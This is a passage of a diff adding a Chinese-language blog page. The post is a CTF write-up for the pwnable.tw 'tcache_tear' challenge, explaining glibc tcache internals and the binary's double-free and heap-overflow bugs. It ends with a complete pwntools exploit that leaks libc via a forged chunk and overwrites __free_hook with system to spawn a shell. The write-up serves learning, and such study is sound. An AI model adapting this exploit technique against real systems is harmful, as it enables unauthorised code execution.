class="meta-keyword">endif</span></span></span><br><span class="line"> <span class="comment">// 遍历完unsorted bin之后，若有合适的chunk则从中返回一个chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h4><p><code>_int_free()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">size</span> = chunksize (p);</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (<span class="built_in">size</span>); </span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">    &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>首先获取要释放的 <code>chunk</code> 的 <code>size</code> , 然后判断 <code>size</code> 是否符和规范（是否对齐之类的 <code>check</code> )， 如果合规就检查<code>tcache-&gt;counts[tc_idx]</code> 是否已经满了 ，如果没有满就直接放入 <code>tcache</code> ， 然后返回。</li>
+<li>否则就和没有 <code>tcache</code> 是一样处理。</li>
+</ul>
+<h2 id="0x03-Tcache-Tear"><a href="#0x03-Tcache-Tear" class="headerlink" title="0x03 Tcache_Tear"></a>0x03 Tcache_Tear</h2><h3 id="程序功能描述"><a href="#程序功能描述" class="headerlink" title="程序功能描述"></a>程序功能描述</h3><p>程序有三个功能：<code>malloc</code>, <code>free</code>, <code>info</code></p>
+<ul>
+<li><p><code>malloc_chunk()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc_chunk</span><span class="params">(<span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> sizea; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  result = (<span class="keyword">void</span> *)read_size();</span><br><span class="line">  sizea = (<span class="keyword">signed</span> <span class="keyword">int</span>)result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)result &lt;= <span class="number">0xFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>((<span class="keyword">size_t</span>)result);  <span class="comment">//ptr at .bss:0000000000602088</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Data:"</span>);</span><br><span class="line">    sub_400A25((__int64)ptr, sizea - <span class="number">16</span>);</span><br><span class="line">    LODWORD(result) = <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>sub_400A25()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_400A25</span><span class="params">(__int64 ptr, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __read_chk(<span class="number">0L</span>L, ptr, len, len);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *(<span class="keyword">unsigned</span> __int8 *)(v3 - <span class="number">1L</span>L + ptr);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v3 - <span class="number">1L</span>L + ptr;</span><br><span class="line">    *(_BYTE *)result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>free()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)ptr;</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>info()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">info</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name :"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">write</span>(<span class="number">1</span>, &amp;name_ptr, <span class="number">0x20</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="漏洞分析及利用"><a href="#漏洞分析及利用" class="headerlink" title="漏洞分析及利用"></a>漏洞分析及利用</h3><ul>
+<li><code>free()</code>的时候，没有检验<code>ptr</code>是否已被释放过，从而导致<code>double free</code>漏洞。</li>
+<li><code>sub_400A25()</code>中的长度是<code>unsigned int</code>，在<code>malloc_chunk</code>中如果长度小于<code>16</code>就会产生堆溢出漏洞。</li>
+</ul>
+<p>因为程序的唯一输出只有<code>info()</code>中的输出<code>name</code>，所以需通过将<code>name_ptr</code>修改成<code>libc</code>的地址，从而造成地址泄露。注意到有<code>double free</code>漏洞的存在，我们可以考虑利用<code>tcache dup</code>来分配指定位置的<code>chunk</code>。</p>
+<ul>
+<li><p>在程序中分配一个<code>chunk</code>将其<code>free</code>两次，可以在<code>tcache</code>中看到两个相同的<code>tcachebin</code>。</p>
+<p><img src="https://s2.ax1x.com/2019/11/17/Mr3EEq.png" alt=""></p>
+</li>
+<li><p>再<code>malloc</code>相应大小的<code>chunk</code>，<code>data</code>中写入想要的地址。两次<code>malloc</code>后我们就能完成相应地址.</p>
+<p><img src="https://s2.ax1x.com/2019/11/17/Mr86m9.png" alt=""></p>
+</li>
+</ul>
+<p>最终方法：可以通过在<code>name_ptr</code>的位置伪造出一个<code>chunk</code>，使它<code>free</code>之后被放入<code>unsorted bin</code>中，从而在<code>name_ptr</code>中写入<code>unsorted bin</code>的地址。再通过<code>info()</code>将地址泄露出来，根据相对偏移得到<code>libc_base</code>。再在<code>__free_hook</code>地址中写入<code>system</code>地址，<code>free</code>一个<code>/bin/sh</code>的<code>chunk</code>，从而获取<code>shell</code>。</p>
+<p><strong>注：</strong>由于<code>tcache</code>所能容纳的最大chunk是<code>1032 = 0x408</code>，所以<code>name_ptr</code>处的<code>chunk</code>要大于<code>0x408</code>。</p>
+<h3 id="所遇问题"><a href="#所遇问题" class="headerlink" title="所遇问题"></a>所遇问题</h3><p>在解题过程中，发现经过<code>double free</code>后分配到所需位置的<code>chunk</code>后，再分配相同大小的<code>chun</code>进行<code>double free</code>的</p>
+<p>时候会出现错误。<code>chunk</code>没有进入<code>tcache bin</code>而是进入了<code>fast bin</code>中。再进行<code>double free</code>就会出现<code>double free or corruption</code>，很是疑惑，经过调试之后发现了问题所在：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache</span><br><span class="line">    &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line"> &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>_int_free()</code>中将<code>chunk</code>放入<code>tcache</code>之前会进行一些检测，其中一条是<code>tcache-&gt;counts[tc_idx]&lt; mp_.tcache_count</code>即对应的<code>tcache bin</code>中的个数小于最大个数<code>7</code>，进行<code>double free</code>后，<code>tcache bin</code>中的的个数为2。由于伪造了一个<code>chunk</code>，从<code>tcache bin</code>中取出了3个<code>chunk</code>是<code>tcache-&gt;counts[tc_idx]</code>变成了<code>-1</code>，在进行条件判断的时候是无符号整数，所以就造成了对应条件不成立使得该<code>chunk</code>没有进入<code>tcache</code>中。如下图所示：</p>
+<p><img src="https://s2.ax1x.com/2019/11/17/MrtBNR.png" alt=""></p>
+<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10207</span>)</span><br><span class="line">elf = ELF(<span class="string">'./tcache_tear'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so'</span>)</span><br><span class="line"></span><br><span class="line">name_addr = <span class="number">0x602060</span></span><br><span class="line">ptr = <span class="number">0x602088</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Name:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'Quincy'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    login()</span><br><span class="line">    alloc(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">5</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    alloc(<span class="number">0x60</span>, p64(name_addr - <span class="number">0x10</span> + <span class="number">0x500</span>))</span><br><span class="line">    alloc(<span class="number">0x60</span>, <span class="string">'a'</span>*<span class="number">5</span>)</span><br><span class="line">    alloc(<span class="number">0x60</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">    alloc(<span class="number">0x70</span>, <span class="string">'a'</span>*<span class="number">5</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    alloc(<span class="number">0x70</span>, p64(name_addr - <span class="number">0x10</span>))</span><br><span class="line">    alloc(<span class="number">0x70</span>, <span class="string">'a'</span>*<span class="number">5</span>)</span><br><span class="line">    alloc(<span class="number">0x70</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(name_addr))</span><br><span class="line">    free()</span><br><span class="line">    info()</span><br><span class="line">    p.recvuntil(<span class="string">'Name :'</span>)</span><br><span class="line">    unsortbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    log.info(<span class="string">'unsortbin_addr: &#123;&#125;'</span>.format(hex(unsortbin_addr)))</span><br><span class="line">    main_arena_addr = unsortbin_addr - <span class="number">0x60</span></span><br><span class="line">    libc_base = main_arena_addr - <span class="number">0x3ebc40</span></span><br><span class="line">    log.info(<span class="string">'libc_base: &#123;&#125;'</span>.format(hex(libc_base)))</span><br><span class="line">    free_hook = libc.symbols[<span class="string">'__free_hook'</span>] + libc_base</span><br><span class="line">    system_addr = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10</span>):</span><br><span class="line">        alloc(<span class="number">0x50</span>, <span class="string">'a'</span>*<span class="number">5</span>)</span><br><span class="line">    alloc(<span class="number">0x50</span>, <span class="string">'a'</span>*<span class="number">5</span>)</span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    alloc(<span class="number">0x50</span>, p64(free_hook))</span><br><span class="line">    alloc(<span class="number">0x50</span>, <span class="string">'a'</span>)</span><br><span class="line">    alloc(<span class="number">0x50</span>, p64(system_addr))</span><br><span class="line">    alloc(<span class="number">0x40</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    free()</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><ul>
+<li><p><a href="https://www.secpulse.com/archives/71958.html" target="_blank" rel="noopener">Pwn Heap With Tcache</a></p>
+</li>
+<li><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-dup" target="_blank" rel="noopener">Tcache_Attack - CTF WIKI</a></p>
+</li>
+<li><p><a href="http://p4nda.top/2018/03/20/tcache/" target="_blank" rel="noopener">tcache 源码分析及利用思路</a></p>
+</li>
+</ul>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-前言"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Tcache"><span class="toc-number">2.</span> <span class="toc-text">0x02 Tcache</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#总体框架"><span class="toc-number">2.1.</span> <span class="toc-text">总体框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据结构"><span class="toc-number">2.2.</span> <span class="toc-text">数据结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关函数"><span class="toc-number">2.3.</span> <span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆管理的细节"><span class="toc-number">2.4.</span> <span class="toc-text">堆管理的细节</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#内存分配"><span class="toc-number">2.4.1.</span> <span class="toc-text">内存分配</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#内存释放"><span class="toc-number">2.4.2.</span> <span class="toc-text">内存释放</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Tcache-Tear"><span class="toc-number">3.</span> <span class="toc-text">0x03 Tcache_Tear</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#程序功能描述"><span class="toc-number">3.1.</span> <span class="toc-text">程序功能描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析及利用"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析及利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#所遇问题"><span class="toc-number">3.3.</span> <span class="toc-text">所遇问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-py"><span class="toc-number">3.4.</span> <span class="toc-text">exp.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考链接"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.quincy.codes/2019/11/17/Tcache_Tear/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&text=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&title=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&is_video=false&description=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=tcache_tear&body=Check out this article: https://blog.quincy.codes/2019/11/17/Tcache_Tear/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&title=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&title=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&title=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&title=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&name=tcache_tear&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Quincy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'quincyblog-top';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
